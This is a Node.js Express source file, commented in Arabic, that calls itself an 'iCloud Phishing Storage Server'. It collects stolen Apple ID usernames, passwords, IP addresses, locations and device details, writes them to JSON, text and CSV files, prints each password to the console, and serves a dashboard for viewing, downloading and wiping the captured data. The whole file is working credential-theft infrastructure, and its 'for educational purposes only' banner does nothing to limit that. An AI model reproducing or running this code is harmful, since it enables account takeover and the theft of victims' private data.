// 📁 storage-server.js - Simple Storage Server (Node.js)

const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// مجلدات التخزين
const storageDir = path.join(__dirname, 'storage');
const credentialsDir = path.join(storageDir, 'credentials');
const visitsDir = path.join(storageDir, 'visits');
const logsDir = path.join(storageDir, 'logs');

// إنشاء المجلدات إذا لم تكن موجودة
[storageDir, credentialsDir, visitsDir, logsDir].forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// 🔐 تشفير البيانات (بسيط)
function encrypt(text) {
    return Buffer.from(text).toString('base64');
}

// 🔓 فك التشفير
function decrypt(text) {
    return Buffer.from(text, 'base64').toString('utf-8');
}

// 📝 تسجيل البيانات
function logData(type, data) {
    const timestamp = new Date().toISOString().replace(/:/g, '-');
    const logFile = path.join(logsDir, `${type}_${timestamp}.json`);
    
    fs.writeFileSync(logFile, JSON.stringify(data, null, 2));
    console.log(`📝 Logged ${type}: ${logFile}`);
}

// 📊 نقطة النهاية لجمع بيانات الاعتماد
app.post('/api/collect/credentials', (req, res) => {
    try {
        const data = req.body;
        const timestamp = new Date().toISOString().replace(/:/g, '-');
        
        // حفظ في ملف JSON
        const filename = `credential_${timestamp}.json`;
        const filepath = path.join(credentialsDir, filename);
        
        // فك التشفير إذا كان مشفراً
        if (data.encrypted && data.data) {
            try {
                data.decrypted = JSON.parse(decrypt(data.data));
            } catch (e) {
                data.decrypted = "Decryption failed";
            }
        }
        
        fs.writeFileSync(filepath, JSON.stringify(data, null, 2));
        
        // حفظ في ملف نصي للقراءة السهلة
        const txtFile = path.join(credentialsDir, 'captured_credentials.txt');
        const logEntry = `
╔═══════════════════════════════════════════════════════════╗
║ 🎯 CREDENTIAL CAPTURED - ${new Date().toLocaleString()}  ║
╚═══════════════════════════════════════════════════════════╝
📧 Apple ID: ${data.decrypted?.appleId || data.appleId || 'N/A'}
🔑 Password: ${data.decrypted?.password || data.password || 'N/A'}
🌐 IP Address: ${data.decrypted?.ip || data.ip || 'N/A'}
📍 Location: ${data.decrypted?.location?.city || 'Unknown'}, ${data.decrypted?.location?.country || 'Unknown'}
📱 Device: ${data.decrypted?.device?.userAgent?.substring(0, 50) || 'Unknown'}
⏰ Time: ${new Date().toLocaleString()}
🆔 Session ID: ${data.decrypted?.sessionId || data.sessionId || 'N/A'}
─────────────────────────────────────────────────────────────
        `;
        
        fs.appendFileSync(txtFile, logEntry);
        
        // تسجيل في الكونسول
        console.log('\n' + '='.repeat(60));
        console.log('🎯 NEW CREDENTIAL CAPTURED!');
        console.log('📧 Apple ID:', data.decrypted?.appleId || data.appleId);
        console.log('🔑 Password:', data.decrypted?.password || data.password);
        console.log('🌐 IP:', data.decrypted?.ip || data.ip);
        console.log('⏰ Time:', new Date().toLocaleString());
        console.log('='.repeat(60) + '\n');
        
        // حفظ في ملف CSV
        const csvFile = path.join(credentialsDir, 'credentials.csv');
        const csvHeader = 'Timestamp,AppleID,Password,IP,Location,UserAgent\n';
        const csvEntry = `"${new Date().toISOString()}","${data.decrypted?.appleId || data.appleId}","${data.decrypted?.password || data.password}","${data.decrypted?.ip || data.ip}","${data.decrypted?.location?.city || 'Unknown'}","${data.decrypted?.device?.userAgent?.substring(0, 100) || 'Unknown'}"\n`;
        
        if (!fs.existsSync(csvFile)) {
            fs.writeFileSync(csvFile, csvHeader);
        }
        fs.appendFileSync(csvFile, csvEntry);
        
        res.json({ success: true, message: 'Credentials saved', filename });
        
    } catch (error) {
        console.error('Error saving credentials:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 👀 نقطة النهاية لجمع بيانات الزيارات
app.post('/api/collect/visits', (req, res) => {
    try {
        const data = req.body;
        const timestamp = new Date().toISOString().replace(/:/g, '-');
        
        const filename = `visit_${timestamp}.json`;
        const filepath = path.join(visitsDir, filename);
        
        fs.writeFileSync(filepath, JSON.stringify(data, null, 2));
        
        // تسجيل في الكونسول
        console.log('👀 New visit from:', data.ip || 'Unknown IP');
        
        res.json({ success: true, message: 'Visit data saved' });
        
    } catch (error) {
        console.error('Error saving visit:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📊 نقطة النهاية لجمع بيانات السلوك
app.post('/api/collect/behavior', (req, res) => {
    try {
        const data = req.body;
        const timestamp = new Date().toISOString().replace(/:/g, '-');
        
        const filename = `behavior_${timestamp}.json`;
        const filepath = path.join(storageDir, 'behavior', filename);
        
        if (!fs.existsSync(path.join(storageDir, 'behavior'))) {
            fs.mkdirSync(path.join(storageDir, 'behavior'), { recursive: true });
        }
        
        fs.writeFileSync(filepath, JSON.stringify(data, null, 2));
        
        console.log('📊 Behavior data saved for session:', data.sessionId);
        
        res.json({ success: true, message: 'Behavior data saved' });
        
    } catch (error) {
        console.error('Error saving behavior:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📈 نقطة النهاية للإحصائيات
app.get('/api/stats', (req, res) => {
    try {
        const stats = {
            totalCredentials: 0,
            totalVisits: 0,
            last24Hours: {
                credentials: 0,
                visits: 0
            },
            topCountries: [],
            deviceStats: {}
        };
        
        // حساب بيانات الاعتماد
        if (fs.existsSync(credentialsDir)) {
            const credFiles = fs.readdirSync(credentialsDir)
                .filter(file => file.endsWith('.json'));
            stats.totalCredentials = credFiles.length;
            
            // آخر 24 ساعة
            const now = Date.now();
            const oneDayAgo = now - (24 * 60 * 60 * 1000);
            
            credFiles.forEach(file => {
                const filepath = path.join(credentialsDir, file);
                const stat = fs.statSync(filepath);
                if (stat.mtimeMs > oneDayAgo) {
                    stats.last24Hours.credentials++;
                }
            });
        }
        
        // حساب الزيارات
        if (fs.existsSync(visitsDir)) {
            const visitFiles = fs.readdirSync(visitsDir)
                .filter(file => file.endsWith('.json'));
            stats.totalVisits = visitFiles.length;
            
            const now = Date.now();
            const oneDayAgo = now - (24 * 60 * 60 * 1000);
            
            visitFiles.forEach(file => {
                const filepath = path.join(visitsDir, file);
                const stat = fs.statSync(filepath);
                if (stat.mtimeMs > oneDayAgo) {
                    stats.last24Hours.visits++;
                }
            });
        }
        
        res.json({ success: true, stats });
        
    } catch (error) {
        console.error('Error getting stats:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📄 نقطة النهاية لعرض البيانات
app.get('/api/data/credentials', (req, res) => {
    try {
        if (!fs.existsSync(credentialsDir)) {
            return res.json({ success: true, credentials: [] });
        }
        
        const files = fs.readdirSync(credentialsDir)
            .filter(file => file.endsWith('.json'))
            .sort()
            .reverse()
            .slice(0, 50); // آخر 50 فقط
        
        const credentials = files.map(file => {
            const filepath = path.join(credentialsDir, file);
            const content = JSON.parse(fs.readFileSync(filepath, 'utf8'));
            return {
                filename: file,
                timestamp: content.timestamp || fs.statSync(filepath).mtime,
                data: {
                    appleId: content.decrypted?.appleId || content.appleId,
                    ip: content.decrypted?.ip || content.ip,
                    location: content.decrypted?.location,
                    device: content.decrypted?.device
                }
            };
        });
        
        res.json({ success: true, credentials });
        
    } catch (error) {
        console.error('Error reading credentials:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📥 تحميل البيانات كملف
app.get('/api/download/:type', (req, res) => {
    try {
        const type = req.params.type;
        const timestamp = new Date().toISOString().replace(/:/g, '-');
        let filepath, filename;
        
        switch (type) {
            case 'credentials':
                filename = `credentials_${timestamp}.json`;
                filepath = path.join(storageDir, filename);
                
                // تجميع جميع بيانات الاعتماد
                const allCreds = [];
                if (fs.existsSync(credentialsDir)) {
                    const files = fs.readdirSync(credentialsDir)
                        .filter(file => file.endsWith('.json'));
                    
                    files.forEach(file => {
                        const content = JSON.parse(
                            fs.readFileSync(path.join(credentialsDir, file), 'utf8')
                        );
                        allCreds.push(content);
                    });
                }
                
                fs.writeFileSync(filepath, JSON.stringify(allCreds, null, 2));
                break;
                
            case 'visits':
                filename = `visits_${timestamp}.json`;
                filepath = path.join(storageDir, filename);
                
                // تجميع جميع الزيارات
                const allVisits = [];
                if (fs.existsSync(visitsDir)) {
                    const files = fs.readdirSync(visitsDir)
                        .filter(file => file.endsWith('.json'));
                    
                    files.forEach(file => {
                        const content = JSON.parse(
                            fs.readFileSync(path.join(visitsDir, file), 'utf8')
                        );
                        allVisits.push(content);
                    });
                }
                
                fs.writeFileSync(filepath, JSON.stringify(allVisits, null, 2));
                break;
                
            default:
                return res.status(400).json({ success: false, error: 'Invalid type' });
        }
        
        res.download(filepath, filename, (err) => {
            if (err) {
                console.error('Error downloading file:', err);
            }
            // حذف الملف المؤقت بعد التحميل
            setTimeout(() => {
                if (fs.existsSync(filepath)) {
                    fs.unlinkSync(filepath);
                }
            }, 5000);
        });
        
    } catch (error) {
        console.error('Error preparing download:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 🗑️ حذف البيانات
app.delete('/api/clear/:type', (req, res) => {
    try {
        const type = req.params.type;
        
        switch (type) {
            case 'credentials':
                if (fs.existsSync(credentialsDir)) {
                    fs.rmSync(credentialsDir, { recursive: true, force: true });
                    fs.mkdirSync(credentialsDir, { recursive: true });
                }
                break;
                
            case 'visits':
                if (fs.existsSync(visitsDir)) {
                    fs.rmSync(visitsDir, { recursive: true, force: true });
                    fs.mkdirSync(visitsDir, { recursive: true });
                }
                break;
                
            case 'all':
                if (fs.existsSync(storageDir)) {
                    fs.rmSync(storageDir, { recursive: true, force: true });
                    [credentialsDir, visitsDir, logsDir].forEach(dir => {
                        fs.mkdirSync(dir, { recursive: true });
                    });
                }
                break;
                
            default:
                return res.status(400).json({ success: false, error: 'Invalid type' });
        }
        
        res.json({ success: true, message: `Cleared ${type} data` });
        
    } catch (error) {
        console.error('Error clearing data:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 🎯 واجهة المستخدم البسيطة
app.get('/dashboard', (req, res) => {
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>iCloud Phishing Dashboard</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f7; }
            .container { max-width: 1200px; margin: 0 auto; }
            .header { background: #007AFF; color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 30px; }
            .stat-card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .stat-value { font-size: 32px; font-weight: bold; color: #007AFF; }
            .stat-label { color: #666; margin-top: 5px; }
            .table-container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            table { width: 100%; border-collapse: collapse; }
            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #eee; }
            th { background: #f9f9f9; font-weight: bold; }
            .actions { display: flex; gap: 10px; margin-top: 20px; }
            .btn { padding: 10px 20px; background: #007AFF; color: white; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; }
            .btn:hover { background: #0056CC; }
            .btn-danger { background: #FF3B30; }
            .btn-danger:hover { background: #D70015; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>📊 iCloud Phishing Dashboard</h1>
                <p>Real-time monitoring and data collection</p>
            </div>
            
            <div class="stats-grid" id="statsGrid">
                <!-- سيتم ملؤها بالجافاسكريبت -->
            </div>
            
            <div class="table-container">
                <h2>📧 Latest Credentials</h2>
                <div id="credentialsTable">
                    <!-- سيتم ملؤها بالجافاسكريبت -->
                </div>
            </div>
            
            <div class="actions">
                <a href="/api/download/credentials" class="btn">📥 Download Credentials</a>
                <a href="/api/download/visits" class="btn">📥 Download Visits</a>
                <button onclick="clearData('all')" class="btn btn-danger">🗑️ Clear All Data</button>
            </div>
        </div>
        
        <script>
            async function loadStats() {
                try {
                    const response = await fetch('/api/stats');
                    const data = await response.json();
                    
                    if (data.success) {
                        const stats = data.stats;
                        document.getElementById('statsGrid').innerHTML = \`
                            <div class="stat-card">
                                <div class="stat-value">\${stats.totalCredentials}</div>
                                <div class="stat-label">Total Credentials</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-value">\${stats.totalVisits}</div>
                                <div class="stat-label">Total Visits</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-value">\${stats.last24Hours.credentials}</div>
                                <div class="stat-label">Credentials (24h)</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-value">\${stats.last24Hours.visits}</div>
                                <div class="stat-label">Visits (24h)</div>
                            </div>
                        \`;
                    }
                } catch (error) {
                    console.error('Error loading stats:', error);
                }
            }
            
            async function loadCredentials() {
                try {
                    const response = await fetch('/api/data/credentials');
                    const data = await response.json();
                    
                    if (data.success && data.credentials.length > 0) {
                        let tableHTML = '<table><tr><th>Time</th><th>Apple ID</th><th>IP</th><th>Location</th><th>Device</th></tr>';
                        
                        data.credentials.forEach(cred => {
                            tableHTML += \`<tr>
                                <td>\${new Date(cred.timestamp).toLocaleString()}</td>
                                <td>\${cred.data.appleId || 'N/A'}</td>
                                <td>\${cred.data.ip || 'N/A'}</td>
                                <td>\${cred.data.location?.city || 'Unknown'}, \${cred.data.location?.country || 'Unknown'}</td>
                                <td>\${cred.data.device?.userAgent?.substring(0, 50) || 'Unknown'}</td>
                            </tr>\`;
                        });
                        
                        tableHTML += '</table>';
                        document.getElementById('credentialsTable').innerHTML = tableHTML;
                    } else {
                        document.getElementById('credentialsTable').innerHTML = '<p>No credentials captured yet.</p>';
                    }
                } catch (error) {
                    console.error('Error loading credentials:', error);
                }
            }
            
            async function clearData(type) {
                if (!confirm('Are you sure you want to clear all data? This cannot be undone.')) {
                    return;
                }
                
                try {
                    const response = await fetch(\`/api/clear/\${type}\`, { method: 'DELETE' });
                    const data = await response.json();
                    
                    if (data.success) {
                        alert('Data cleared successfully!');
                        loadStats();
                        loadCredentials();
                    }
                } catch (error) {
                    console.error('Error clearing data:', error);
                    alert('Error clearing data');
                }
            }
            
            // تحميل البيانات عند بدء التشغيل
            loadStats();
            loadCredentials();
            
            // تحديث كل 30 ثانية
            setInterval(() => {
                loadStats();
                loadCredentials();
            }, 30000);
        </script>
    </body>
    </html>
    `;
    
    res.send(html);
});

// 🏃 تشغيل الخادم
app.listen(PORT, () => {
    console.log(`
    🚀 iCloud Phishing Storage Server
    📡 Running on: http://localhost:${PORT}
    
    📊 Endpoints:
    POST /api/collect/credentials  - Save captured credentials
    POST /api/collect/visits       - Save visit data
    GET  /api/stats               - Get statistics
    GET  /api/data/credentials    - Get recent credentials
    GET  /dashboard              - Web dashboard
    GET  /api/download/:type     - Download data
    DELETE /api/clear/:type      - Clear data
    
    📁 Storage directories created:
    ${storageDir}
    ├── credentials/
    ├── visits/
    └── logs/
    
    ⚠️  FOR EDUCATIONAL PURPOSES ONLY
    `);
});

module.exports = app;
